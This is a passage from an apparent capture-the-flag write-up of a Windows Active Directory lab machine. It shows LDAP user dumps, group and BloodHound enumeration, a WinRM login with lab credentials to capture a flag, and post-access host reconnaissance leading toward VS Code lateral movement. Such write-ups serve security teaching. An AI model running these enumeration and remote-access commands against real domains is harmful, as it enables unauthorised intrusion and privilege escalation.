objectguid:            c684cfaf-1477-44f8-b'a0e4'-936c5d9b2c5d
objectsid:             S-1-5-21-3167813660-1240564177-918740779-3108
primarygroupid:        513
profilepath:
pwdlastset:            2020-01-09 07:25:27.247405
samaccountname:        rmartin
samaccounttype:        805306368
scriptpath:
sn:                    Martin
useraccountcontrol:    ['NORMAL_ACCOUNT', 'DONT_EXPIRE_PASSWORD']
userprincipalname:     rmartin@MEGACORP.LOCAL
usnchanged:            90453
usncreated:            90348
whenchanged:           2020-01-09 12:32:17
whencreated:           2020-01-09 12:25:27

accountexpires:        9223372036854775807
badpasswordtime:       1600-12-31 19:03:58
badpwdcount:           0
cn:                    Zac Curtis
codepage:              0
countrycode:           0
displayname:           Zac Curtis
distinguishedname:     CN=Zac Curtis,OU=Frankfurt,OU=Employees,DC=MEGACORP,DC=LOCAL
dscorepropagationdata: 2020-01-09 12:32:17,
                       2020-01-09 12:26:06,
                       1601-01-01 00:00:00
givenname:             Zac
homedirectory:
instancetype:          4
isgroup:               False
lastlogoff:            1600-12-31 19:03:58
lastlogon:             1600-12-31 19:03:58
logoncount:            0
name:                  Zac Curtis
objectcategory:        CN=Person,CN=Schema,CN=Configuration,DC=MEGACORP,DC=LOCAL
objectclass:           top,
                       person,
                       organizationalPerson,
                       user
objectguid:            0bdc875a-fbad-40a1-b'afae'-8f6732d75c61
objectsid:             S-1-5-21-3167813660-1240564177-918740779-3109
primarygroupid:        513
profilepath:
pwdlastset:            2020-01-09 07:26:06.809980
samaccountname:        zac
samaccounttype:        805306368
scriptpath:
sn:                    Curtis
useraccountcontrol:    ['NORMAL_ACCOUNT', 'DONT_EXPIRE_PASSWORD']
userprincipalname:     zac@MEGACORP.LOCAL
usnchanged:            90452
usncreated:            90356
whenchanged:           2020-01-09 12:32:17
whencreated:           2020-01-09 12:26:06

accountexpires:        9223372036854775807
admincount:            0
badpasswordtime:       1600-12-31 19:03:58
badpwdcount:           0
cn:                    Jorden Mclean
codepage:              0
countrycode:           0
displayname:           Jorden Mclean
distinguishedname:     CN=Jorden Mclean,OU=Athens,OU=Employees,DC=MEGACORP,DC=LOCAL
dscorepropagationdata: 2020-01-10 00:59:48,
                       2020-01-09 23:56:27,
                       2020-01-09 23:09:16,
                       2020-01-09 20:07:19,
                       1601-01-01 00:00:00
givenname:             Jorden
homedirectory:
instancetype:          4
isgroup:               False
lastlogoff:            1600-12-31 19:03:58
lastlogon:             1600-12-31 19:03:58
lastlogontimestamp:    132230924531001219
logoncount:            0
memberof:              CN=Developers,OU=Groups,DC=MEGACORP,DC=LOCAL,
                       CN=Server Operators,CN=Builtin,DC=MEGACORP,DC=LOCAL,
                       CN=Remote Management Users,CN=Builtin,DC=MEGACORP,DC=LOCAL
name:                  Jorden Mclean
objectcategory:        CN=Person,CN=Schema,CN=Configuration,DC=MEGACORP,DC=LOCAL
objectclass:           top,
                       person,
                       organizationalPerson,
                       user
objectguid:            0fa62545-eff1-4805-b'b16f'-a18cf4217418
objectsid:             S-1-5-21-3167813660-1240564177-918740779-3110
primarygroupid:        513
profilepath:
pwdlastset:            2020-01-09 19:48:17.503303
samaccountname:        jorden
samaccounttype:        805306368
scriptpath:
sn:                    Mclean
useraccountcontrol:    ['NORMAL_ACCOUNT', 'DONT_EXPIRE_PASSWORD']
userprincipalname:     jorden@MEGACORP.LOCAL
usnchanged:            110709
usncreated:            90365
whenchanged:           2020-01-10 01:14:13
whencreated:           2020-01-09 12:26:42

accountexpires:        9223372036854775807
badpasswordtime:       1600-12-31 19:03:58
badpwdcount:           0
cn:                    Alyx Walter
codepage:              0
countrycode:           0
displayname:           Alyx Walter
distinguishedname:     CN=Alyx Walter,OU=Athens,OU=Employees,DC=MEGACORP,DC=LOCAL
dscorepropagationdata: 2020-01-09 12:32:32,
                       2020-01-09 12:27:06,
                       1601-01-01 00:00:00
givenname:             Alyx
homedirectory:
instancetype:          4
isgroup:               False
lastlogoff:            1600-12-31 19:03:58
lastlogon:             1600-12-31 19:03:58
logoncount:            0
name:                  Alyx Walter
objectcategory:        CN=Person,CN=Schema,CN=Configuration,DC=MEGACORP,DC=LOCAL
objectclass:           top,
                       person,
                       organizationalPerson,
                       user
objectguid:            f6c507f2-0b24-4ad7-b'8f14'-ce2f407a6bf7
objectsid:             S-1-5-21-3167813660-1240564177-918740779-3111
primarygroupid:        513
profilepath:
pwdlastset:            2020-01-09 07:27:06.435149
samaccountname:        alyx
samaccounttype:        805306368
scriptpath:
sn:                    Walter
useraccountcontrol:    ['NORMAL_ACCOUNT', 'DONT_EXPIRE_PASSWORD']
userprincipalname:     alyx@MEGACORP.LOCAL
usnchanged:            90457
usncreated:            90373
whenchanged:           2020-01-09 12:32:32
whencreated:           2020-01-09 12:27:06

accountexpires:        9223372036854775807
badpasswordtime:       1600-12-31 19:03:58
badpwdcount:           0
cn:                    Ian Lee
codepage:              0
countrycode:           0
displayname:           Ian Lee
distinguishedname:     CN=Ian Lee,OU=Tokyo,OU=Employees,DC=MEGACORP,DC=LOCAL
dscorepropagationdata: 2020-01-09 12:32:00,
                       2020-01-09 12:27:24,
                       1601-01-01 00:00:00
givenname:             Ian
homedirectory:
instancetype:          4
isgroup:               False
lastlogoff:            1600-12-31 19:03:58
lastlogon:             1600-12-31 19:03:58
logoncount:            0
name:                  Ian Lee
objectcategory:        CN=Person,CN=Schema,CN=Configuration,DC=MEGACORP,DC=LOCAL
objectclass:           top,
                       person,
                       organizationalPerson,
                       user
objectguid:            5a9af48f-e96d-4cdf-b'8095'-b877c509ed53
objectsid:             S-1-5-21-3167813660-1240564177-918740779-3112
primarygroupid:        513
profilepath:
pwdlastset:            2020-01-09 07:27:24.028883
samaccountname:        ilee
samaccounttype:        805306368
scriptpath:
sn:                    Lee
useraccountcontrol:    ['NORMAL_ACCOUNT', 'DONT_EXPIRE_PASSWORD']
userprincipalname:     ilee@MEGACORP.LOCAL
usnchanged:            90447
usncreated:            90382
whenchanged:           2020-01-09 12:32:00
whencreated:           2020-01-09 12:27:24

accountexpires:        9223372036854775807
badpasswordtime:       1600-12-31 19:03:58
badpwdcount:           0
cn:                    Nikola Bourne
codepage:              0
countrycode:           0
displayname:           Nikola Bourne
distinguishedname:     CN=Nikola Bourne,OU=London,OU=Employees,DC=MEGACORP,DC=LOCAL
dscorepropagationdata: 2020-01-09 12:32:09,
                       2020-01-09 12:27:45,
                       1601-01-01 00:00:00
givenname:             Nikola
homedirectory:
instancetype:          4
isgroup:               False
lastlogoff:            1600-12-31 19:03:58
lastlogon:             1600-12-31 19:03:58
logoncount:            0
name:                  Nikola Bourne
objectcategory:        CN=Person,CN=Schema,CN=Configuration,DC=MEGACORP,DC=LOCAL
objectclass:           top,
                       person,
                       organizationalPerson,
                       user
objectguid:            548cdf63-b24d-4165-b'88b4'-f3c7e8ff861a
objectsid:             S-1-5-21-3167813660-1240564177-918740779-3113
primarygroupid:        513
profilepath:
pwdlastset:            2020-01-09 07:27:45.607049
samaccountname:        nbourne
samaccounttype:        805306368
scriptpath:
sn:                    Bourne
useraccountcontrol:    ['NORMAL_ACCOUNT', 'DONT_EXPIRE_PASSWORD']
userprincipalname:     nbourne@MEGACORP.LOCAL
usnchanged:            90449
usncreated:            90391
whenchanged:           2020-01-09 12:32:09
whencreated:           2020-01-09 12:27:45

accountexpires:        9223372036854775807
badpasswordtime:       1600-12-31 19:03:58
badpwdcount:           0
cn:                    Zachery Powers
codepage:              0
countrycode:           0
displayname:           Zachery Powers
distinguishedname:     CN=Zachery Powers,OU=New York,OU=Employees,DC=MEGACORP,DC=LOCAL
dscorepropagationdata: 2020-01-09 12:31:24,
                       2020-01-09 12:28:28,
                       1601-01-01 00:00:00
givenname:             Zachery
homedirectory:
instancetype:          4
isgroup:               False
lastlogoff:            1600-12-31 19:03:58
lastlogon:             1600-12-31 19:03:58
logoncount:            0
name:                  Zachery Powers
objectcategory:        CN=Person,CN=Schema,CN=Configuration,DC=MEGACORP,DC=LOCAL
objectclass:           top,
                       person,
                       organizationalPerson,
                       user
objectguid:            8e25ad28-a670-41f7-b'8f41'-0df0550c7fd1
objectsid:             S-1-5-21-3167813660-1240564177-918740779-3114
primarygroupid:        513
profilepath:
pwdlastset:            2020-01-09 07:28:28.075909
samaccountname:        zpowers
samaccounttype:        805306368
scriptpath:
sn:                    Powers
useraccountcontrol:    ['NORMAL_ACCOUNT', 'DONT_EXPIRE_PASSWORD']
userprincipalname:     zpowers@MEGACORP.LOCAL
usnchanged:            90443
usncreated:            90399
whenchanged:           2020-01-09 12:31:24
whencreated:           2020-01-09 12:28:28

accountexpires:        9223372036854775807
badpasswordtime:       1600-12-31 19:03:58
badpwdcount:           0
cn:                    Alessandro Dominguez
codepage:              0
countrycode:           0
displayname:           Alessandro Dominguez
distinguishedname:     CN=Alessandro Dominguez,OU=London,OU=Employees,DC=MEGACORP,DC=LOCAL
dscorepropagationdata: 2020-01-09 12:32:36,
                       2020-01-09 12:28:53,
                       1601-01-01 00:00:00
givenname:             Alessandro
homedirectory:
instancetype:          4
isgroup:               False
lastlogoff:            1600-12-31 19:03:58
lastlogon:             1600-12-31 19:03:58
logoncount:            0
memberof:              CN=Developers,OU=Groups,DC=MEGACORP,DC=LOCAL
name:                  Alessandro Dominguez
objectcategory:        CN=Person,CN=Schema,CN=Configuration,DC=MEGACORP,DC=LOCAL
objectclass:           top,
                       person,
                       organizationalPerson,
                       user
objectguid:            0d1589a0-e3ae-431b-b'8568'-b99922fdc40f
objectsid:             S-1-5-21-3167813660-1240564177-918740779-3115
primarygroupid:        513
profilepath:
pwdlastset:            2020-01-09 07:28:53.607197
samaccountname:        aldom
samaccounttype:        805306368
scriptpath:
sn:                    Dominguez
useraccountcontrol:    ['NORMAL_ACCOUNT', 'DONT_EXPIRE_PASSWORD']
userprincipalname:     aldom@MEGACORP.LOCAL
usnchanged:            90458
usncreated:            90408
whenchanged:           2020-01-09 12:32:36
whencreated:           2020-01-09 12:28:53

accountexpires:        9223372036854775807
badpasswordtime:       1600-12-31 19:03:58
badpwdcount:           0
cn:                    John Simmons
codepage:              0
countrycode:           0
displayname:           John Simmons
distinguishedname:     CN=John Simmons,OU=London,OU=Employees,DC=MEGACORP,DC=LOCAL
dscorepropagationdata: 2020-01-09 12:32:09,
                       2020-01-09 12:29:14,
                       1601-01-01 00:00:00
givenname:             John
homedirectory:
instancetype:          4
isgroup:               False
lastlogoff:            1600-12-31 19:03:58
lastlogon:             1600-12-31 19:03:58
logoncount:            0
name:                  John Simmons
objectcategory:        CN=Person,CN=Schema,CN=Configuration,DC=MEGACORP,DC=LOCAL
objectclass:           top,
                       person,
                       organizationalPerson,
                       user
objectguid:            72d0a96f-4ee7-4641-b'9253'-11bd94ab2e6d
objectsid:             S-1-5-21-3167813660-1240564177-918740779-3116
primarygroupid:        513
profilepath:
pwdlastset:            2020-01-09 07:29:14.950992
samaccountname:        jsmmons
samaccounttype:        805306368
scriptpath:
sn:                    Simmons
useraccountcontrol:    ['NORMAL_ACCOUNT', 'DONT_EXPIRE_PASSWORD']
userprincipalname:     jsmmons@MEGACORP.LOCAL
usnchanged:            90450
usncreated:            90417
whenchanged:           2020-01-09 12:32:09
whencreated:           2020-01-09 12:29:14

accountexpires:        9223372036854775807
badpasswordtime:       1600-12-31 19:03:58
badpwdcount:           0
cn:                    Penelope Martin
codepage:              0
countrycode:           0
displayname:           Penelope Martin
distinguishedname:     CN=Penelope Martin,OU=Frankfurt,OU=Employees,DC=MEGACORP,DC=LOCAL
dscorepropagationdata: 2020-01-09 12:32:17,
                       2020-01-09 12:29:39,
                       1601-01-01 00:00:00
givenname:             Penelope
homedirectory:
instancetype:          4
isgroup:               False
lastlogoff:            1600-12-31 19:03:58
lastlogon:             1600-12-31 19:03:58
logoncount:            0
name:                  Penelope Martin
objectcategory:        CN=Person,CN=Schema,CN=Configuration,DC=MEGACORP,DC=LOCAL
objectclass:           top,
                       person,
                       organizationalPerson,
                       user
objectguid:            72b44502-30e3-4e13-b'9a37'-ebf8fc14ad1d
objectsid:             S-1-5-21-3167813660-1240564177-918740779-3117
primarygroupid:        513
profilepath:
pwdlastset:            2020-01-09 07:29:39.013565
samaccountname:        pmartin
samaccounttype:        805306368
scriptpath:
sn:                    Martin
useraccountcontrol:    ['NORMAL_ACCOUNT', 'DONT_EXPIRE_PASSWORD']
userprincipalname:     pmartin@MEGACORP.LOCAL
usnchanged:            90454
usncreated:            90425
whenchanged:           2020-01-09 12:32:17
whencreated:           2020-01-09 12:29:39
```

### Domain Group

The `Privileged IT Accounts`, `test`, and `Developers` accounts are all non-standard. The `SQLServer2005SQLBrowserUser$MULTIMASTER` group indicates the presence of MSSQL, which was discovered previously.

```bash
$ pywerview get-netgroup -w megacorp.local -u tushikikatomo -p finance1 --dc-ip 10.129.95.200
samaccountname: Administrators
samaccountname: Users
samaccountname: Guests
samaccountname: Print Operators
samaccountname: Backup Operators
samaccountname: Replicator
samaccountname: Remote Desktop Users
samaccountname: Network Configuration Operators
samaccountname: Performance Monitor Users
samaccountname: Performance Log Users
samaccountname: Distributed COM Users
samaccountname: IIS_IUSRS
samaccountname: Cryptographic Operators
samaccountname: Event Log Readers
samaccountname: Certificate Service DCOM Access
samaccountname: RDS Remote Access Servers
samaccountname: RDS Endpoint Servers
samaccountname: RDS Management Servers
samaccountname: Hyper-V Administrators
samaccountname: Access Control Assistance Operators
samaccountname: Remote Management Users
samaccountname: System Managed Accounts Group
samaccountname: Storage Replica Administrators
samaccountname: Domain Computers
samaccountname: Domain Controllers
samaccountname: Schema Admins
samaccountname: Enterprise Admins
samaccountname: Cert Publishers
samaccountname: Domain Admins
samaccountname: Domain Users
samaccountname: Domain Guests
samaccountname: Group Policy Creator Owners
samaccountname: RAS and IAS Servers
samaccountname: Server Operators
samaccountname: Account Operators
samaccountname: Pre-Windows 2000 Compatible Access
samaccountname: Incoming Forest Trust Builders
samaccountname: Windows Authorization Access Group
samaccountname: Terminal Server License Servers
samaccountname: Allowed RODC Password Replication Group
samaccountname: Denied RODC Password Replication Group
samaccountname: Read-only Domain Controllers
samaccountname: Enterprise Read-only Domain Controllers
samaccountname: Cloneable Domain Controllers
samaccountname: Protected Users
samaccountname: Key Admins
samaccountname: Enterprise Key Admins
samaccountname: DnsAdmins
samaccountname: DnsUpdateProxy
samaccountname: Privileged IT Accounts
samaccountname: test
samaccountname: SQLServer2005SQLBrowserUser$MULTIMASTER
samaccountname: Developers
```

### Domain Graph

```bash
$ bloodhound-python -d megacorp.local -u tushikikatomo -p finance1 -c All -ns 10.129.95.200
INFO: Found AD domain: megacorp.local
INFO: Connecting to LDAP server: MULTIMASTER.MEGACORP.LOCAL
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: MULTIMASTER.MEGACORP.LOCAL
INFO: Found 27 users
INFO: Connecting to GC LDAP server: MULTIMASTER.MEGACORP.LOCAL
INFO: Found 56 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: MULTIMASTER.MEGACORP.LOCAL
INFO: Done in 00M 12S
```

`tushikikatomo` has `CanPSRemote` access to the target.

![](images/Pasted%20image%2020211125150621.png)

`sbauer` has some interesting privileges. It not only has `CanPSRemote` access to the target, but it also has `GenericWrite` access to `jorden`, who is a member of the `Server Operators` group. `sbauer` and `jorden` are also members of the `Developers` group.

![](images/Pasted%20image%2020211125151353.png)

---

## WinRM Access as `tushikikatomo`

According to the domain enumeration output, `tushikikatomo` is a member of the `Remote Managemennt Users` group, which is capable of accessing the domain controller via WinRM. Grab the user flag.

```bash
$ evil-winrm -i 10.129.95.200 -u megacorp.local\\tushikikatomo -p finance1

Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\alcibiades\Documents> ls ../Desktop


    Directory: C:\Users\alcibiades\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       11/25/2021   1:10 PM             34 user.txt
```

Attempting to list the `C:\DFSRoots\dfs\Development` folder results in the following error:

```powershell
*Evil-WinRM* PS C:\DFSROots\dfs\Development> ls
The network location cannot be reached. For information about network troubleshooting, see Windows Help.

At line:1 char:1
+ ls
+ ~~
    + CategoryInfo          : ReadError: (C:\DFSROots\dfs\Development:String) [Get-ChildItem], IOException
    + FullyQualifiedErrorId : DirIOError,Microsoft.PowerShell.Commands.GetChildItemCommand
```

Also:

```powershell
*Evil-WinRM* PS C:\DFSROots\dfs\Development> Get-DfsnRoot
Cannot connect to CIM server. Access denied
At line:1 char:1
+ Get-DfsnRoot
+ ~~~~~~~~~~~~
    + CategoryInfo          : ResourceUnavailable: (MSFT_DFSNamespace:String) [Get-DfsnRoot], CimJobException
    + FullyQualifiedErrorId : CimJob_BrokenCimSession,Get-DfsnRoot
```

### Current User

```powershell
*Evil-WinRM* PS C:\DFSROots\dfs\Development> whoami /all

USER INFORMATION
----------------

User Name              SID
====================== =============================================
megacorp\tushikikatomo S-1-5-21-3167813660-1240564177-918740779-1110


GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

### Listening Ports

```powershell
*Evil-WinRM* PS C:\DFSROots\dfs\Development> netstat -ano | select-string LISTEN

  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       620
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       848
  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       620
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING       620
  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING       848
  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING       620
  TCP    0.0.0.0:1433           0.0.0.0:0              LISTENING       688
  TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING       620
  TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING       620
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       992
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING       2448
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       504
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       72
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1360
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       620
  TCP    0.0.0.0:49673          0.0.0.0:0              LISTENING       1500
  TCP    0.0.0.0:49674          0.0.0.0:0              LISTENING       620
  TCP    0.0.0.0:49675          0.0.0.0:0              LISTENING       620
  TCP    0.0.0.0:49678          0.0.0.0:0              LISTENING       2364
  TCP    0.0.0.0:49690          0.0.0.0:0              LISTENING       2428
  TCP    0.0.0.0:49698          0.0.0.0:0              LISTENING       612
  TCP    0.0.0.0:49735          0.0.0.0:0              LISTENING       2420
  TCP    10.129.95.200:53       0.0.0.0:0              LISTENING       2428
  TCP    10.129.95.200:139      0.0.0.0:0              LISTENING       4
  TCP    127.0.0.1:53           0.0.0.0:0              LISTENING       2428
  TCP    127.0.0.1:1434         0.0.0.0:0              LISTENING       688
  TCP    127.0.0.1:2399         0.0.0.0:0              LISTENING       5968
  TCP    127.0.0.1:45716        0.0.0.0:0              LISTENING       6012
  TCP    127.0.0.1:56508        0.0.0.0:0              LISTENING       6132
  TCP    127.0.0.1:61725        0.0.0.0:0              LISTENING       5504
  TCP    [::]:80                [::]:0                 LISTENING       4
  TCP    [::]:88                [::]:0                 LISTENING       620
  TCP    [::]:135               [::]:0                 LISTENING       848
  TCP    [::]:389               [::]:0                 LISTENING       620
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:464               [::]:0                 LISTENING       620
  TCP    [::]:593               [::]:0                 LISTENING       848
  TCP    [::]:636               [::]:0                 LISTENING       620
  TCP    [::]:1433              [::]:0                 LISTENING       688
  TCP    [::]:3389              [::]:0                 LISTENING       992
  TCP    [::]:5985              [::]:0                 LISTENING       4
  TCP    [::]:9389              [::]:0                 LISTENING       2448
  TCP    [::]:47001             [::]:0                 LISTENING       4
  TCP    [::]:49664             [::]:0                 LISTENING       504
  TCP    [::]:49665             [::]:0                 LISTENING       72
  TCP    [::]:49666             [::]:0                 LISTENING       1360
  TCP    [::]:49669             [::]:0                 LISTENING       620
  TCP    [::]:49673             [::]:0                 LISTENING       1500
  TCP    [::]:49674             [::]:0                 LISTENING       620
  TCP    [::]:49675             [::]:0                 LISTENING       620
  TCP    [::]:49678             [::]:0                 LISTENING       2364
  TCP    [::]:49690             [::]:0                 LISTENING       2428
  TCP    [::]:49698             [::]:0                 LISTENING       612
  TCP    [::]:49735             [::]:0                 LISTENING       2420
  TCP    [::1]:53               [::]:0                 LISTENING       2428
  TCP    [::1]:1434             [::]:0                 LISTENING       688
  TCP    [fe80::3883:2de8:90ec:64fc%5]:53  [::]:0                 LISTENING       2428
```

### Network Interfaces

```powershell
*Evil-WinRM* PS C:\DFSROots\dfs\Development> ipconfig /all

Windows IP Configuration

   Host Name . . . . . . . . . . . . : MULTIMASTER
   Primary Dns Suffix  . . . . . . . : MEGACORP.LOCAL
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : MEGACORP.LOCAL
                                       .htb

Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : .htb
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
   Physical Address. . . . . . . . . : 00-50-56-B9-ED-87
   DHCP Enabled. . . . . . . . . . . : Yes
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::3883:2de8:90ec:64fc%5(Preferred)
   IPv4 Address. . . . . . . . . . . : 10.129.95.200(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Lease Obtained. . . . . . . . . . : Thursday, November 25, 2021 1:09:30 PM
   Lease Expires . . . . . . . . . . : Thursday, November 25, 2021 2:14:29 PM
   Default Gateway . . . . . . . . . : 10.129.0.1
   DHCP Server . . . . . . . . . . . : 10.129.0.1
   DHCPv6 IAID . . . . . . . . . . . : 251678806
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-29-31-B3-E1-00-50-56-B9-ED-87
   DNS Servers . . . . . . . . . . . : 1.1.1.1
                                       1.0.0.1
   NetBIOS over Tcpip. . . . . . . . : Enabled

Tunnel adapter isatap..htb:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : .htb
   Description . . . . . . . . . . . : Microsoft ISATAP Adapter
   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
```

### Running Processes

```powershell
*Evil-WinRM* PS C:\DFSROots\dfs\Development> ps

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    364      13     1940       4272               368   0 csrss
    212      15     1848       4068               484   1 csrss
    351      31    13288      22192              2420   0 dfsrs
    174      13     2444       7704              2700   0 dfssvc
    214      13     3636      12456              3168   0 dllhost
  10318    7405   129644     126432              2428   0 dns
    320      21    24804      44764               944   1 dwm
   1127      48    16848      65324              4832   1 explorer
      0       0        0          4                 0   0 Idle
    112      12     1744       5412              2456   0 ismserv
   1674     149    54548      59736               620   0 lsass
    631      29    37236      46084              2448   0 Microsoft.ActiveDirectory.WebServices
    156      10     2308       8528              4336   0 MpCmdRun
    190      13     2640       9744              3280   0 msdtc
    592      71   183716     151996              2620   0 MsMpEng
    171      39     3920       8800              4196   0 NisSrv
    344      11     5068      10220               612   0 services
    254      14     2916      16868              4740   1 sihost
     51       2      376       1212               288   0 smss
    419      22     5596      16056              2364   0 spoolsv
    523      29    58944      66632               572   0 sqlceip
    755     102   393772     256040               688   0 sqlservr
    106       9     1716       7584              2480   0 sqlwriter
    500      18    12268      18968                72   0 svchost
    853      30     8908      22268                76   0 svchost
    494      30    11916      21716               332   0 svchost
    437      34    10400      18316               336   0 svchost
    567      21     5684      18676               792   0 svchost
    640      45     9364      22312               812   0 svchost
    582      19     3876       9580               848   0 svchost
    434      18     3908      11576               992   0 svchost
   1503      53    21820      46436              1360   0 svchost
    157      11     1664       6832              1492   0 svchost
    139      12     1836       7016              1500   0 svchost
    238      18     2424       9084              2144   0 svchost
    140      11     3744      10524              2404   0 svchost
    185      16     4052      14880              2548   0 svchost
    194      14     4764      11700              2608   0 svchost
    286      18     4284      19012              4628   1 svchost
    934       0      128        140                 4   0 System
    231      16     3008      13592              4716   1 taskhostw
    195      16     2304      10676              1868   0 vds
    140      11     3088      10220              2556   0 VGAuthService
    105       7     1376       5680              1216   0 vm3dservice
    105       8     1480       6652              4484   1 vm3dservice
    201      17     4932      14716              2100   1 vmtoolsd
    341      21    10252      22216              2584   0 vmtoolsd
     92       8      944       4860               504   0 wininit
    203      10     1944      10252               560   1 winlogon
    315      15     7416      16004              3076   0 WmiPrvSE
   1126      32    63028      83756       3.77   6068   0 wsmprovhost
    258      11     1816       7940              1320   0 WUDFHost
```

Both `winpeas` and `PowerUp` were blocked by Windows Defender.

---

## Visual Studio Code Remote Debugger Lateral Movement

Visual Studio Code appears to be the most significant non-standard program on the target.

```powershell
*Evil-WinRM* PS C:\program files> ls


    Directory: C:\program files


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        9/25/2019  10:59 AM                Common Files
d-----         1/9/2020   2:39 PM                Internet Explorer
d-----         1/7/2020   9:40 PM                Microsoft
da----         1/7/2020   7:47 PM                Microsoft SQL Server
d-----         1/7/2020   7:26 PM                Microsoft Visual Studio 10.0
da----         1/9/2020   3:18 AM                Microsoft VS Code
d-----         1/7/2020   7:27 PM                Microsoft.NET
d-----         1/7/2020   9:43 PM                Reference Assemblies
d-----        7/19/2021   1:07 AM                VMware
d-r---         1/9/2020   2:46 PM                Windows Defender
d-----         1/9/2020   2:39 PM                Windows Mail
d-----         1/9/2020   2:39 PM                Windows Media Player
d-----        7/16/2016   6:23 AM                Windows Multimedia Platform
d-----        7/16/2016   6:23 AM                Windows NT
d-----         1/9/2020   2:39 PM                Windows Photo Viewer
d-----        7/16/2016   6:23 AM                Windows Portable Devices
d-----        7/16/2016   6:23 AM                WindowsPowerShell
```

When looking at the running processes again, Visual Studio Code appears to be running.

```cmd
*Evil-WinRM* PS C:\Users\alcibiades\Documents> ps

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
     59       5     1912       3580              4584   1 cmd
    278      51    58200      74600              2836   1 Code
    321      31    38216      64456              3112   1 Code
    614      39    30520      74976              3212   1 Code
    403      53    93700     131640              3508   1 Code
    397      21    14888      23988              4644   1 Code
    193      15     6104      12600              5800   1 Code
     85       8     4888       5264              6072   1 conhost
    364      13     1852       4240               372   0 csrss
    242      16     1900       4136               492   1 csrss
    355      31    13660      22284              2460   0 dfsrs
    168      13     2348       7616              2784   0 dfssvc
    219      13     3708      12432              3196   0 dllhost
  10317    7412   129636     126528              2444   0 dns
    322      22    24840      46468               316   1 dwm
   1134      48    16652      65640              4552   1 explorer
      0       0        0          4                 0   0 Idle
    113      12     1756       5380              2452   0 ismserv
   1705     153    55084      66716               624   0 lsass
    525      30    37860      47064              2420   0 Microsoft.ActiveDirectory.WebServices
    168      10     2464       8568              2752   0 MpCmdRun
    190      13     2620       9736              3352   0 msdtc
    611      72   181448     149300              2720   0 MsMpEng
    173      11     4516       9580              2908   0 NisSrv
    347      12     4680      10240               612   0 services
    262      14     3120      17236              4744   1 sihost
     51       2      384       1212               292   0 smss
    417      22     5640      16076              2376   0 spoolsv
    724      29    59940      67664              3804   0 sqlceip
    666     102   392464     259960              1356   0 sqlservr
    106       9     1728       7588              2552   0 sqlwriter
    490      30    11852      21648               332   0 svchost
    674      47    10620      23632               352   0 svchost
    574      21     5724      18800               792   0 svchost
    587      18     4040       9712               848   0 svchost
    431      18     3976      11552               952   0 svchost
    839      30     8840      22200              1004   0 svchost
    508      18    13088      19744              1020   0 svchost
    433      34    10368      18400              1092   0 svchost
    141      13     1840       6984              1148   0 svchost
   1531      54    23380      48220              1220   0 svchost
    157      11     1680       6880              1552   0 svchost
    240      18     2628       9232              2172   0 svchost
    140      11     3792      10468              2412   0 svchost
